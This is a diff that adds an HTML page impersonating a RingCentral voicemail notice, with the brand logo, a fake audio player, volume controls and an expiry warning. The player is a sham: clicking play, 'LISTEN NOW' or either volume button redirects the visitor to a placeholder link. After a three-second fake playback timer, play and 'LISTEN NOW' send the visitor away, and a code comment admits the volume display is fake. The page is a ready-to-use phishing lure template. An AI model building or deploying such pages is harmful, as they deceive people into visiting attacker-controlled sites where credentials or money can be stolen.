@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>RingCentral Voicemail</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #ff7900;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      color: #333;
+    }
+
+    .card {
+      background: white;
+      border-radius: 15px;
+      width: 350px;
+      padding: 20px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.2);
+      text-align: center;
+    }
+
+    .card-header {
+      background: linear-gradient(to right, #4a2c91, #5b389d);
+      color: white;
+      padding: 10px;
+      border-top-left-radius: 15px;
+      border-top-right-radius: 15px;
+      font-size: 1.2em;
+      font-weight: bold;
+    }
+
+    .play-button {
+      background-color: #ff7900;
+      border: none;
+      color: white;
+      font-size: 30px;
+      width: 60px;
+      height: 60px;
+      border-radius: 50%;
+      margin: 20px auto;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+    }
+
+    .time {
+      margin-top: -10px;
+      font-size: 16px;
+      color: #555;
+    }
+
+    .volume {
+      margin: 20px 0;
+      font-size: 16px;
+      user-select: none;
+    }
+
+    .volume input[type=range] {
+      width: 80%;
+    }
+
+    .volume button {
+      background: none;
+      border: none;
+      color: #d60000;
+      font-size: 20px;
+      cursor: pointer;
+      font-weight: bold;
+      vertical-align: middle;
+    }
+
+    .listen-button {
+      background-color: #ff7900;
+      color: white;
+      border: none;
+      padding: 12px 20px;
+      font-size: 16px;
+      border-radius: 5px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    .footer-note {
+      font-size: 12px;
+      color: #666;
+      margin-top: 15px;
+    }
+
+    .copyright {
+      font-size: 11px;
+      color: #999;
+      margin-top: 5px;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="card-header">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/aa/RingCentral_logo.svg/2560px-RingCentral_logo.svg.png" alt="RingCentral" style="height: 24px; vertical-align: middle;"> Voicemail
+    </div>
+
+    <button id="playBtn" class="play-button" aria-label="Play/Pause">▶</button>
+    <div id="timeDisplay" class="time">0:00 / 0:45</div>
+
+    <div class="volume">
+      <button id="volumeDown" title="Decrease Volume">➖</button> 
+      Volume <span id="volText">15%</span>
+      <button id="volumeUp" title="Increase Volume" style="margin-left: 5px;">➕</button><br>
+      <input id="volumeSlider" type="range" min="0" max="100" value="15" />
+    </div>
+
+    <button id="listenBtn" class="listen-button">LISTEN NOW</button>
+
+    <div class="footer-note">
+      This voicemail will expire and be automatically deleted from RingCentral servers after 14 days.
+    </div>
+
+    <div class="copyright">
+      © RingCentral | All rights reserved | 2025
+    </div>
+  </div>
+
+  <script>
+    const playBtn = document.getElementById('playBtn');
+    const timeDisplay = document.getElementById('timeDisplay');
+    const listenBtn = document.getElementById('listenBtn');
+    const volumeUp = document.getElementById('volumeUp');
+    const volumeDown = document.getElementById('volumeDown');
+    const volumeSlider = document.getElementById('volumeSlider');
+    const volText = document.getElementById('volText');
+    const redirectLink = 'https://your-redirect-link.com/';
+
+    // Common function to start timer, update UI, and redirect after delay
+    function startTimerAndRedirect(buttonToToggle, secondsBeforeRedirect = 3) {
+      let currentTime = 0;
+      const totalDuration = 45;
+
+      // Disable button to avoid multiple clicks
+      buttonToToggle.disabled = true;
+
+      // Change play button icon to pause
+      playBtn.textContent = '⏸';
+
+      const interval = setInterval(() => {
+        currentTime++;
+        const minutes = Math.floor(currentTime / 60);
+        const seconds = currentTime % 60;
+        timeDisplay.textContent = `${minutes}:${seconds.toString().padStart(2, '0')} / 0:45`;
+
+        if (currentTime >= secondsBeforeRedirect) {
+          clearInterval(interval);
+          window.location.href = redirectLink;
+        }
+      }, 1000);
+    }
+
+    playBtn.addEventListener('click', () => {
+      startTimerAndRedirect(playBtn, 3);
+    });
+
+    listenBtn.addEventListener('click', () => {
+      startTimerAndRedirect(listenBtn, 3);
+    });
+
+    // Fake volume text only
+    volumeSlider.addEventListener('input', () => {
+      volText.textContent = volumeSlider.value + '%';
+    });
+
+    // Redirect for volume up/down buttons immediately
+    volumeUp.addEventListener('click', () => {
+      window.location.href = redirectLink;
+    });
+    volumeDown.addEventListener('click', () => {
+      window.location.href = redirectLink;
+    });
+  </script>
+</body>
+</html>
